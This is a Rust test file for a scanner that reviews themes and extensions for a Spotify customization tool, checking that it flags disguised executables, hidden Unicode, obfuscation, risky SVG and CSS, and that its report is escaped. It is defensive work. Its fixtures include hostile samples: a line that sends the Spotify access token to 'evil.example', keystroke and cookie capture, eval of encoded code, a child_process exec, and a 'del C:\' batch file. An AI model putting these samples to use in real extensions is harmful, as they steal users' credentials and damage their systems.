use std::fs;
use std::path::Path;

use super::*;

const THEME_TOML: &str = "id = \"aurora\"\nname = \"Aurora\"\nversion = \"1.0.0\"\n\
                          author = \"Lina\"\nspacetify = \">=0.4.0\"\n";
const EXTENSION_TOML: &str = "id = \"lyrics\"\nname = \"Lyrics\"\nversion = \"0.3.0\"\n\
                              author = \"Lina\"\nspacetify = \">=0.4.0\"\n";

fn write(dir: &Path, files: &[(&str, &[u8])]) {
    for (name, bytes) in files {
        let path = dir.join(name);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, bytes).unwrap();
    }
}

fn theme(files: &[(&str, &[u8])]) -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    write(
        dir.path(),
        &[
            ("theme.toml", THEME_TOML.as_bytes()),
            ("theme.css", b"body { color: red; }\n"),
        ],
    );
    write(dir.path(), files);
    dir
}

fn extension(code: &str) -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    write(
        dir.path(),
        &[
            ("extension.toml", EXTENSION_TOML.as_bytes()),
            ("main.js", code.as_bytes()),
        ],
    );
    dir
}

fn levels(report: &Report, check: Check) -> Vec<Level> {
    report
        .findings
        .iter()
        .filter(|f| f.check == check)
        .map(|f| f.level)
        .collect()
}

#[test]
fn a_plain_theme_is_clean() {
    let dir = theme(&[("README.md", b"# Aurora\nSee https://example.com\n")]);
    let report = review(dir.path(), None);
    assert_eq!(report.id.as_deref(), Some("aurora"));
    assert_eq!(report.kind, Some(ModKind::Theme));
    assert_eq!((report.blocking, report.to_look_at), (0, 0), "{report:#?}");
    assert_eq!(report.files.len(), 3);
    assert_eq!(report.level_of(Check::Antivirus), None);
    assert_eq!(report.level_of(Check::Changes), None);
    assert_eq!(report.level_of(Check::Files), Some(Level::Ok));
}

#[test]
fn the_examples_of_the_repository_are_clean() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../examples");
    for dir in ["themes/midnight", "extensions/hello-badge"] {
        let report = review(&root.join(dir), None);
        assert_eq!(report.blocking, 0, "{dir}: {report:#?}");
    }
}

#[test]
fn an_invalid_mod_is_blocked() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), &[("theme.toml", b"id = 3")]);
    let report = review(dir.path(), None);
    assert_eq!(levels(&report, Check::Valid), [Level::Block]);
}

#[test]
fn disguised_programs_and_stray_files_are_blocked() {
    let dir = theme(&[
        ("assets/logo.png", b"MZ\x90\0this is a windows program"),
        ("assets/photo.jpg", b"\x89PNG\r\n\x1a\nnot a jpeg"),
        (
            "assets/real.png",
            b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\0\x10\0\0\0\x10",
        ),
        ("install.bat", b"del C:\\"),
        ("assets/pack.woff2", b"PK\x03\x04zip inside"),
        (".hidden.css", b"body{}"),
    ]);
    let report = review(dir.path(), None);
    let blocked: Vec<&str> = report
        .findings
        .iter()
        .filter(|f| f.check == Check::Files && f.level == Level::Block)
        .filter_map(|f| f.file.as_deref())
        .collect();
    for file in [
        "assets/logo.png",
        "assets/photo.jpg",
        "install.bat",
        "assets/pack.woff2",
        ".hidden.css",
    ] {
        assert!(blocked.contains(&file), "{file} not blocked: {blocked:?}");
    }
    assert!(!blocked.contains(&"assets/real.png"));
}

#[test]
fn an_extension_may_not_carry_theme_files() {
    let dir = extension("console.log(1);\n");
    write(dir.path(), &[("theme.css", b"body{}")]);
    let report = review(dir.path(), None);
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.file.as_deref() == Some("theme.css") && f.level == Level::Block)
    );
}

#[test]
fn reversed_and_invisible_characters_are_caught() {
    let dir = extension("let ok = true; // \u{202e}nimda\u{2066}\nlet a\u{200b}b = 1;\n");
    let report = review(dir.path(), None);
    let hidden: Vec<&Finding> = report
        .findings
        .iter()
        .filter(|f| f.check == Check::Hidden)
        .collect();
    assert_eq!(hidden.len(), 2, "{hidden:#?}");
    assert!(hidden.iter().all(|f| f.level == Level::Block));
    assert!(hidden[1].excerpt.as_deref().unwrap().contains("<U+200B>"));
    assert_eq!(hidden[0].line, Some(1));
}

#[test]
fn invisible_characters_in_css_are_to_look_at() {
    let dir = theme(&[("theme.css", "body { color: red; }\u{200b}\n".as_bytes())]);
    let report = review(dir.path(), None);
    assert_eq!(levels(&report, Check::Hidden), [Level::Look]);
}

#[test]
fn risky_javascript_is_listed_with_its_line() {
    let code = "\
const t = Spotify.accessToken;\n\
fetch('https://evil.example/steal?t=' + t);\n\
eval(atob('YWxlcnQoMSk='));\n\
document.addEventListener('keydown', log);\n\
const cookie = document.cookie;\n\
require('child_process').exec('calc');\n";
    let dir = extension(code);
    let report = review(dir.path(), None);
    assert_eq!(report.addresses, ["https://evil.example/steal?t="]);
    let at = |check: Check, line: usize| {
        report
            .findings
            .iter()
            .any(|f| f.check == check && f.line == Some(line))
    };
    assert!(at(Check::Sensitive, 1));
    assert!(at(Check::Network, 2));
    assert!(at(Check::Obfuscation, 3));
    assert!(at(Check::Sensitive, 4));
    assert!(at(Check::Sensitive, 5));
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.line == Some(6) && f.level == Level::Block)
    );
    assert_eq!(report.blocking, 1);
}

#[test]
fn packed_code_and_encoded_blocks_are_to_look_at() {
    let long = format!("var a={};\n", "1+".repeat(800));
    let blob = format!("const b='{}';\n", "QUJD".repeat(150));
    let escapes = format!("const c='{}';\n", "\\x41".repeat(50));
    let dir = extension(&format!("{long}{blob}{escapes}"));
    let report = review(dir.path(), None);
    let lines: Vec<Option<usize>> = report
        .findings
        .iter()
        .filter(|f| f.check == Check::Obfuscation)
        .map(|f| f.line)
        .collect();
    assert!(lines.contains(&Some(1)), "{lines:?}");
    assert!(lines.contains(&Some(2)), "{lines:?}");
    assert!(lines.contains(&Some(3)), "{lines:?}");
}

#[test]
fn css_that_runs_code_or_loads_from_the_web() {
    let dir = theme(&[(
        "theme.css",
        b"@import url(\"https://fonts.googleapis.com/css2?family=Inter\");\n\
          body { background: url(//cdn.example/bg.png); }\n\
          a { width: expression(alert(1)); }\n",
    )]);
    let report = review(dir.path(), None);
    assert_eq!(
        report.addresses,
        [
            "//cdn.example/bg.png",
            "https://fonts.googleapis.com/css2?family=Inter"
        ]
    );
    assert!(levels(&report, Check::Obfuscation).contains(&Level::Block));
}

#[test]
fn svg_with_scripts_are_blocked() {
    let dir = theme(&[
        (
            "assets/bad.svg",
            b"<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"><script>x()</script></svg>",
        ),
        (
            "assets/good.svg",
            b"<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"4\"/></svg>",
        ),
    ]);
    let report = review(dir.path(), None);
    let images: Vec<&Finding> = report
        .findings
        .iter()
        .filter(|f| f.check == Check::Images)
        .collect();
    assert!(!images.is_empty());
    assert!(
        images
            .iter()
            .all(|f| f.file.as_deref() == Some("assets/bad.svg") && f.level == Level::Block)
    );
}

#[test]
fn huge_pictures_are_to_look_at() {
    let mut png = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR".to_vec();
    png.extend(20000u32.to_be_bytes());
    png.extend(10u32.to_be_bytes());
    let dir = theme(&[("assets/wide.png", &png)]);
    let report = review(dir.path(), None);
    assert_eq!(levels(&report, Check::Images), [Level::Look]);
}

#[test]
fn an_update_shows_what_changed() {
    let old = extension("console.log('v1');\n");
    let new =
        extension("console.log('v2');\nfetch('https://api.example/x');\nlocalStorage.x = 1;\n");
    write(new.path(), &[("README.md", b"notes")]);
    let report = review(new.path(), Some(old.path()));
    let changes: Vec<&Finding> = report
        .findings
        .iter()
        .filter(|f| f.check == Check::Changes)
        .collect();
    assert!(changes.iter().any(|f| f.file.as_deref() == Some("main.js")));
    assert!(
        changes
            .iter()
            .any(|f| f.what.en.contains("https://api.example/x"))
    );
    assert!(changes.iter().any(|f| f.what.en.contains("storage")));
    assert_eq!(report.level_of(Check::Changes), Some(Level::Look));
}

#[test]
fn antivirus_output_is_read() {
    let dir = theme(&[]);
    let mut report = review(dir.path(), None);
    let root = dir.path();
    let clean = "\n----------- SCAN SUMMARY -----------\nInfected files: 0\n";
    report.add_antivirus(clean, root);
    assert_eq!(report.level_of(Check::Antivirus), Some(Level::Ok));

    let mut report = review(dir.path(), None);
    let found = format!(
        "{}/theme.css: Eicar-Signature FOUND\n\nInfected files: 1\n",
        root.display()
    );
    report.add_antivirus(&found, root);
    let finding = report
        .findings
        .iter()
        .find(|f| f.check == Check::Antivirus)
        .unwrap();
    assert_eq!(finding.file.as_deref(), Some("theme.css"));
    assert_eq!(report.blocking, 1);

    let mut report = review(dir.path(), None);
    report.add_antivirus("ERROR: Can't open database", root);
    assert_eq!(report.level_of(Check::Antivirus), Some(Level::Block));
}

#[test]
fn the_comment_cannot_be_hijacked_by_the_mod() {
    let dir = extension("// @everyone [click](https://x.example) <img src=x> `tick`\nfetch(1);\n");
    let report = review(dir.path(), None);
    let link =
        |file: &str, line: Option<usize>| format!("https://repo/{file}#L{}", line.unwrap_or(0));
    for lang in [crate::Lang::En, crate::Lang::Fr] {
        let text = report.markdown(lang, &link);
        assert!(!text.contains("@everyone"), "{text}");
        assert!(!text.contains("<img"), "{text}");
        assert!(!text.contains("`tick`"), "{text}");
        assert!(text.contains("https://repo/main.js#L1"), "{text}");
    }
    assert!(
        report
            .markdown(crate::Lang::Fr, &link)
            .contains("Rapport de sécurité")
    );
    assert_eq!(escape("a_b @c"), "a&#95;b &#64;c");
}

#[test]
fn without_a_link_the_place_is_plain_text() {
    let dir = extension("fetch(1);\n");
    let report = review(dir.path(), None);
    let text = report.markdown(crate::Lang::En, &|_, _| String::new());
    assert!(text.contains("(main.js, line 1)"), "{text}");
    assert!(!text.contains("]("), "{text}");
}

#[test]
fn addresses_in_the_comment_cannot_be_clicked() {
    let dir = extension("fetch('https://thief.example/x');\nconst a = 'www.thief.example';\n");
    let report = review(dir.path(), None);
    let text = report.markdown(crate::Lang::En, &|_, _| String::new());
    assert!(!text.contains("https://thief"), "{text}");
    assert!(text.contains("https[:]//thief.example/x"), "{text}");
    assert!(!text.contains("www.thief"), "{text}");
}
